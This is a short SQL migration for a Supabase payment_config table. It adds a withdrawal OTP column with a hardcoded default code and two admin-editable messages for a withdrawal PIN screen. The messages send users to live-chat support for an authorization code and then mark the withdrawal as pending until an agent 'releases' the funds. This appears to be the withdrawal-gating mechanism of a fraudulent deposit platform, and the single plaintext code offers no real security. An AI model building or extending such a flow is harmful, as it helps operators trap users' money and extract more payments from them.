-- ============================================================================
-- Withdrawal verification settings — run once in the Supabase SQL Editor.
-- Adds the support-issued OTP and the two admin-customizable messages shown
-- on the withdrawal PIN screen to the payment_config table.
-- ============================================================================

alter table if exists public.payment_config
  add column if not exists withdrawal_otp text not null default '90152313',
  add column if not exists withdrawal_pin_instructions text not null default
    'Enter the 8-digit withdrawal authorization code (OTP). This code is issued by our support team — contact support via live chat to receive yours.',
  add column if not exists withdrawal_pin_result text not null default
    'Your withdrawal request has been received and is now pending final verification. A support agent will reach out shortly to release your funds.';
